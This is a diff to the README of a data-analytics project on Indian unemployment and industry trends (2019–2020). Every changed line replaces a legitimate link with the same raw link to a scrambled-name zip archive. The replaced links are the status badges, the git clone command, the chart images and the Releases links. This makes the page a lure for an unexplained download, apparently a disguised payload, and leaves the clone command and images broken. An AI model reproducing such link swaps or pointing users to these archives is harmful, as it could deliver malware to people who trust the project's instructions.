@@ -1,8 +1,8 @@
 # Unemployment and Industry Analysis in India (2019–2020) 📊🇮🇳
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS)
-![GitHub Issues](https://img.shields.io/github/issues/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS)
-![GitHub Pull Requests](https://img.shields.io/github/issues-pr/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS)
+![GitHub Repo Size](https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip)
+![GitHub Issues](https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip)
+![GitHub Pull Requests](https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip)
 
 Explore the unemployment and industry trends in India from 2019 to 2020 using data analytics techniques. This repository provides insights into employment patterns, industry performance, and the overall economic landscape during a critical period.
 
@@ -28,7 +28,7 @@ This project aims to analyze the unemployment rate and industry trends in India 
 To get started with this project, clone the repository and install the necessary dependencies. 
 
 ```bash
-git clone https://github.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS.git
+git clone https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip
 cd UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS
 ```
 
@@ -85,11 +85,11 @@ The repository contains various visualizations to illustrate the findings. Here 
 
 - **Unemployment Rate Over Time**:
   
-  ![Unemployment Rate](https://example.com/unemployment-rate.png)
+  ![Unemployment Rate](https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip)
 
 - **Industry Growth Comparison**:
 
-  ![Industry Growth](https://example.com/industry-growth.png)
+  ![Industry Growth](https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip)
 
 You can find more visualizations in the Jupyter Notebook files within the repository.
 
@@ -97,7 +97,7 @@ You can find more visualizations in the Jupyter Notebook files within the reposi
 
 To run the analysis, open the Jupyter Notebook files in the `notebooks` directory. Each notebook contains code blocks that you can execute step by step. 
 
-For the latest updates and releases, visit the [Releases section](https://github.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/releases).
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip).
 
 ## Contributing
 
@@ -107,4 +107,4 @@ Contributions are welcome. If you have suggestions or improvements, please open 
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-For the latest updates and releases, visit the [Releases section](https://github.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/releases).
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/usmangani123664/UNEMPLOYMENT-AND-INDUSTRY-ANALYSIS-USING-DATA-ANALYTICS/main/Vai/ANALYTICS-DAT-INDUSTR-UNEMPLOYMEN-ANALYSI-AN-USIN-v3.5.zip).
